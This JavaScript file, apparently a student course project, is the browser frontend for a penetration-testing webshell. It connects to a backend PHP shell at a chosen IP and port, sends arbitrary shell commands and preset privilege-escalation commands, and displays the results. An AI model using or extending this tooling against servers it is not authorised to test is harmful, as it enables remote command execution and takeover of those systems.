/**
    * Nathan Johnson
    * 11/29/18
    * CSE 154
    * Section AK
    * This is the javascript page for my pentester's notes webshell page.  It provides the frontend
    * behavior for the webshell.
*/
(function() {
    "use strict";
    let url;
    console.log(document.referrer);
    if(document.referrer === "http://localhost/index.html" ||
    document.referrer === "http://localhost/" ||
    document.referrer === "http://localhost") {
        window.addEventListener("load", initialize);
    } else {
        document.location = "index.html";
    }
    /**
        * This function initializes the program.  It sets up listeners for all the buttons
        * on the page and sets the cookie/working directory for the webshell to "/"
    */
    function initialize(){
        $("get-target-btn").addEventListener("click", checkConnection);
        $("backtomain").addEventListener("click", function() {
            connectionError("true");}
        );
        $("simpleshell-btn").addEventListener("click", simpleShell);
        $("privesc-btn").addEventListener("click", privEsc);
        $("submit-btn").addEventListener("click", function() {
            fetchShellCommand(qsa(".input-field")[3].value);}
        );
        $("clear-btn").addEventListener("click", clearResults);
        $("priv-results-btn").addEventListener("click", fetchPrivResults);
        document.cookie = "/";
    }
    /**
        * this function checks to make sure the connection to the backend php script is sound by
        * sending it a GET fetch request.  It then redirects the flow of the program depending on
        * whether or not this request was successful
    */
    function checkConnection(){
        let ip = qsa(".input-field")[0].value;
        let uri =qsa(".input-field")[1].value;
        let port = qsa(".input-field")[2].value;
        if (ip.slice(0, 4) === "http") {
            ip = ip.slice(7);
        }
        url = "http://" + ip + ":" + port + uri;
        let fullUrl = url + "?check=true";
        fetch(fullUrl)
        .then(checkStatus)
        .then(JSON.parse)
        .then(optionsScreen)
        .catch(connectionError);
    }

    /**
        * This function hides the currently displayed section, and displays the error section
        * @param {object} apiData - the JSON object from the backend php api
    */
    function connectionError(apiData){
        if (apiData.name != "true"){
            if(qsa("main > section")[4].classList[0] != "hidden"){
                qsa("main > section")[4].classList.toggle("hidden");
            } else if (qsa("main > section")[2].classList[0] != "hidden"){
                qsa("main > section")[2].classList.toggle("hidden");
            } else {
                qsa("main > section")[0].classList.toggle("hidden");
            }
            qsa("main > section")[3].classList.toggle("hidden");
        }
    }

    /**
        * This function hides the options page, and displays the simple shell page
    */
    function simpleShell(){
        qsa("main > section")[1].classList.toggle("hidden");
        qsa("main > section")[2].classList.toggle("hidden");
    }

    /**
        * This function clears the command results printed on the webshell page
    */
    function clearResults(){
        while(qsa("article").length > 1){
        qsa("article")[1].remove();
        }
        qs("article").innerText = "";
        qs("article").classList = ".hidden";
    }

    /**
        * This function performs a fetch POST request to a backend php script.  It then receives the
        * JSON formatted response, and redirects the flow of the program depending on whether or not
        * the request was successful.
        * @param {string} command - any shell command the user wishes to run on the target server
    */
    function fetchShellCommand(command){
        qsa(".input-field")[3].value = "";
        let params = new FormData();
        params.append("cmd", command);
        params.append("dir", document.cookie);
        fetch(url, {
            method: "post",
            body: params})
        .then(checkStatus)
        .then(JSON.parse)
        .then(apiData => displayResults(apiData, command))
        .catch(connectionError);
    }

    /**
        * This function displays the results of a POST api fetch request
        * @param {object} apiData - the response to a fetch POST request in JSON format
        * @param {string} command - any shell command the user wishes to run on the target server
    */
    function displayResults(apiData, command){
        document.cookie = apiData.dir;
        let shellResults = document.createElement("section");
        let commandSection = document.createElement("section");
        shellResults.innerText = apiData.name;
        commandSection.innerText = "******** " + command + " ********";
        if(qsa("main > section")[4].classList.contains("hidden")){
            $("search-results").appendChild(shellResults);
        } else {
            $("privesc-results").appendChild(shellResults);
            $("privesc-results").appendChild(commandSection);
        }
    }

    /**
        * This function hides the options screen and displays the privilege escalation screen
    */
    function privEsc(){
        if(document.getElementsByName("ostype")[0].checked){
            alert("no windows privesc functionality yet, sowwy");
        } else{
            qsa("main > section")[1].classList.toggle("hidden");
            qsa("main > section")[4].classList.toggle("hidden");
        }
    }

    /**
        * This function sets up the needed variables for a POST fetch request, and then calls the
        * function that makes the POST request
    */
    function fetchPrivResults(){
        let privCmdArray = [];
        for(let i=0; i<qsa(".privesc-command").length; i++){
            if(qsa(".privesc-command")[i].checked){
                privCmdArray.push(qsa(".privesc-command")[i].value);
            }
        }
        for(let i=0; i<privCmdArray.length; i++){
            fetchShellCommand(privCmdArray[i]);

        }
    }

    /**
        * This function hides the landing section and displays the options section
    */
    function optionsScreen(){
            qsa("main > section")[0].classList.toggle("hidden");
            qsa("main > section")[1].classList.toggle("hidden");
    }

    /**
        * This Function returns a DOM element by its given id
        * @param {string} id - given element id
        * @returns {object} DOM object defined by given id
    */
    function $(id){
        return document.getElementById(id);
    }

    /**
        * This Function returns a DOM element by its css selector
        * @param {string} query - given element's css selector
        * @returns {object} DOM element defined by given css selector
    */
    function qs(query){
        return document.querySelector(query);
    }

    /**
        * This Function returns an array of DOM elements by their shared css selector
        * @param {string} query - given elements' css selector
        * @return {object[]} array of DOM elements defined by given css selector
    */
    function qsa(query){
        return document.querySelectorAll(query);
    }

    /**
        * Helper function to return the response's result text if successful, otherwise
        * returns the rejected Promise result with an error status and corresponding text
        * @param {object} response - response to check for success/error
        * @returns {object} - valid result text if response was successful, otherwise rejected
        * Promise result
    */
    function checkStatus(response) {
        const OK = 200;
        const ERROR = 300;
        let responseText = response.text();
        if (response.status >= OK && response.status < ERROR || response.status === 0) {
            return responseText;
        } else {
            return responseText.then(Promise.reject.bind(Promise));
        }
    }
})();
